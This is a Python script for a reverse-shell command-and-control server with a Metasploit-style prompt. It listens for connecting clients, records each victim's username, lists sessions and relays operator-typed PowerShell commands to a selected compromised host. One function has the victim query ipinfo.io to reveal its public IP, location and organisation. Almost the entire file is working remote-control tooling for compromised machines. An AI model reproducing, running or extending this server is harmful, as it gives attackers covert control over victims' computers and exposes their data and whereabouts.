import os
import time
import socket
import colorama
import threading

colorama.init()

print(colorama.Fore.RED + "\nTCP_Server...\n")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sett = {
    "ip"   : "127.0.0.1",
    "port" : "5050"
}

data_client = []

is_conn = True

def whoami(conn):
    conn.send(bytes("whoami", "utf-8"))
    return conn.recv(64).decode("utf-8")[0:-2]

def getinfoip(conn):
    conn.send(bytes("$ip = Invoke-RestMethod http://ipinfo.io/json; $ip.ip; $ip.hostname; $ip.city; $ip.region; $ip.country; $ip.loc; $ip.org; $ip.postal", "utf-8"))
    
    r = conn.recv(200).decode("utf-8").replace("\r", "").split("\n")
    print(r)

def lisss():
    print("<Server> waiting for connections...")

    while is_conn:
        conn, addr = s.accept()
        # getinfoip(conn)
        data_client.append([conn, addr, whoami(conn)])

def test_connections():
    global data_client

    for i in data_client:
        try:
            whoami(i[0])
        except:
            print(f"[IP: {i[1][0]}, NAME: {i[2]}] the client has disconnected")
            data_client.remove(i)

def start_server():
    global is_conn
    
    while is_conn:
        con = input(colorama.Fore.BLUE + "@Server>").lower().split(" ")

        if con[0] == "exit":
            is_conn = False
        elif con[0] == "help":
            print("commands: sessions, session <client number>, test, exit")
        elif con[0] == "sessions":
            if len(data_client) == 0:
                print("NO CLIENTS")
                continue
            print("")
            for i in range(len(data_client)):
                print(f"client: {i}, name: {data_client[i][2]}, ip: {data_client[i][1][0]}, port: {data_client[i][1][1]}")
            print("")
        elif con[0] == "session":
            if len(data_client) == 0:
                print("NO CLIENTS")
                continue

            while True:
                try:
                    command = input(f"{colorama.Fore.RED}@Client/{data_client[int(con[1])][2]}>{colorama.Fore.LIGHTBLUE_EX}")

                    if command == "exit":
                        break
                    elif command == "help":
                        print("u can use powershell commands")
                        continue

                    data_client[int(con[1])][0].send(bytes(command, "utf-8"))
                    data_client[int(con[1])][0].settimeout(0.8)

                    while True:
                        try:
                            print(data_client[int(con[1])][0].recv(16).decode("utf-8"), end="")
                        except socket.timeout:
                            break

                except Exception as e:
                    print(f"client Error: {e}")
        
        elif con[0] == "test":
            test_connections()

while True:
    n = input(colorama.Fore.RED + f"@TCP_Server=>").lower().replace("  ", " ").split(" ")# .remove(" ")

    try:
        if n[0] == "show":
            if n[1] == "options":
                print("")
                for pp in sett:
                    print(f"{pp} = {sett[pp]}")
                print("")

        elif n[0] == "set":
            print("")
            print(f"{n[1]} = {n[2]}")
            print("")

            sett[n[1]] = n[2]

        elif n[0] == "run" or n[0] == "exploit":
            try:
                ip = sett["ip"]
                port = int(sett["port"])

                s.bind((ip, port))
                s.listen(7)
                print(f"TCP_Server is running. ip:{ip}, port:{port}\n")
                threading.Thread(target=lisss).start()
                start_server()

            except Exception as e:
                print(f"Error: {e}")

        elif n[0] == "exit":
            break

    except Exception as e:
        print(f"Error: {e}")

    
